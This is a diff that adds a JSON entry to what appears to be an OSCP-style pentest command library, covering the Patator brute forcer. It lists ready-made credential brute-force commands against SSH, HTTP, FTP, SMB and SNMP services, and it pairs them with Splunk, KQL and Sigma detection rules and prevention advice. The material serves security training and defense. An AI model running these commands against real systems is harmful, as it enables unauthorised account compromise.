@@ -1,0 +1,89 @@
+{
+  "id": "crack-patator",
+  "name": "Patator - Multi-Protocol Brute Forcer",
+  "command": "patator ssh_login host=<target> user=FILE0 password=FILE1 0=users.txt 1=passwords.txt -x ignore:mesg=\"Authentication failed\"",
+  "description": "Patator is a modular multi-protocol brute forcer supporting SSH, FTP, HTTP, SMB, LDAP, VNC, SNMP, and more. It offers granular response filtering (by status, content, size), threading control, and resume capability. More flexible than Hydra for complex authentication schemes and custom response handling.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "loud",
+  "category": "Password Attacks",
+  "subcategory": "Brute Force",
+  "certifications": [
+    "OSCP",
+    "CPTS"
+  ],
+  "primary_cert": "OSCP",
+  "source": "lanjelot/patator; OSCP password attack methodology",
+  "tags": [
+    "patator",
+    "brute-force",
+    "password-spray",
+    "ssh",
+    "http",
+    "multi-protocol"
+  ],
+  "mitre": [
+    "T1110.001",
+    "T1110.003"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== SSH BRUTE FORCE ===\n  patator ssh_login host=<target> user=FILE0 password=FILE1 0=users.txt 1=passwords.txt -x ignore:mesg=\"Authentication failed\"\n\n=== HTTP POST LOGIN ===\n  patator http_fuzz url=\"http://<target>/login\" method=POST body=\"user=FILE0&pass=FILE1\" 0=users.txt 1=passwords.txt -x ignore:fgrep=\"Invalid\"\n\n=== HTTP BASIC AUTH ===\n  patator http_fuzz url=\"http://<target>/admin\" user_pass=FILE0:FILE1 0=users.txt 1=passwords.txt -x ignore:code=401\n\n=== FTP ===\n  patator ftp_login host=<target> user=FILE0 password=FILE1 0=users.txt 1=passwords.txt -x ignore:mesg=\"Login incorrect\"\n\n=== SMB ===\n  patator smb_login host=<target> user=FILE0 password=FILE1 0=users.txt 1=passwords.txt -x ignore:fgrep=\"STATUS_LOGON_FAILURE\"\n\n=== SNMP COMMUNITY STRINGS ===\n  patator snmp_login host=<target> community=FILE0 0=communities.txt -x ignore:mesg=\"error\"\n\n=== RESPONSE FILTERING ===\n  -x ignore:code=401          # Ignore HTTP 401\n  -x ignore:fgrep=\"Invalid\"   # Ignore responses containing text\n  -x ignore:size=1234          # Ignore by response size\n  -x quit:code=302             # Stop on redirect (success)",
+  "examples": [
+    {
+      "label": "SSH brute force",
+      "command": "patator ssh_login host=192.168.1.10 user=FILE0 password=FILE1 0=users.txt 1=passwords.txt -x ignore:mesg=\"Authentication failed\""
+    },
+    {
+      "label": "HTTP POST form login",
+      "command": "patator http_fuzz url=\"http://target.com/login\" method=POST body=\"user=FILE0&pass=FILE1\" 0=users.txt 1=passwords.txt -x ignore:fgrep=\"Invalid\""
+    },
+    {
+      "label": "SNMP community string brute force",
+      "command": "patator snmp_login host=192.168.1.10 community=FILE0 0=/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt -x ignore:mesg=\"error\""
+    }
+  ],
+  "references": [
+    {
+      "title": "Patator - GitHub",
+      "url": "https://github.com/lanjelot/patator"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-kerbrute-userenum",
+      "note": "Kerbrute for AD user enumeration; Patator for protocol-level brute force.",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Patator systematically tries credential combinations against network services. Its modular architecture supports many protocols and its filtering system identifies successful logins efficiently.",
+    "prerequisites": "Network access to the target service; username and password lists.",
+    "impact": "Compromise of service accounts; initial foothold through brute-forced credentials.",
+    "detection": "[MITRE T1110] Multiple failed authentication attempts from a single source; account lockout events.",
+    "artifacts": "Authentication failure logs (SSH auth.log, Windows 4625, web access logs); account lockout events (4740).",
+    "splunk_spl": "index=linux sourcetype=linux_secure \"Failed password\"\n| stats count by src_ip, user\n| where count > 10\n| sort -count",
+    "elastic_kql": "event.outcome:\"failure\" AND event.category:\"authentication\"",
+    "sentinel_kql": "Syslog\n| where SyslogMessage has \"Failed password\"\n| summarize FailCount=count() by SrcIP=extract(@\"from (\\S+)\", 1, SyslogMessage), User=extract(@\"for (\\S+)\", 1, SyslogMessage)\n| where FailCount > 10",
+    "sigma_rules": "linux_auth_brute_force_ssh",
+    "prevention": "Account lockout policies; fail2ban; rate limiting; MFA; strong password requirements; IP allowlisting for admin services.",
+    "sources": [
+      "OSCP methodology",
+      "https://attack.mitre.org/techniques/T1110/001/"
+    ],
+    "detections": [
+      {
+        "platform": "sigma",
+        "name": "SSH brute force from single source",
+        "logic": "title: SSH Brute Force Attack\nstatus: experimental\nlogsource:\n  product: linux\n  service: sshd\ndetection:\n  selection:\n    sshd_auth_fail: true\n  condition: selection | count(src_ip) by src_ip > 10\n  timeframe: 5m\nlevel: high",
+        "data_source": "linux-auth",
+        "attack": [
+          "T1110.001"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Users with mistyped passwords; automated scripts with stale credentials",
+        "tuning": "Adjust threshold based on environment; whitelist jump boxes"
+      }
+    ]
+  }
+}
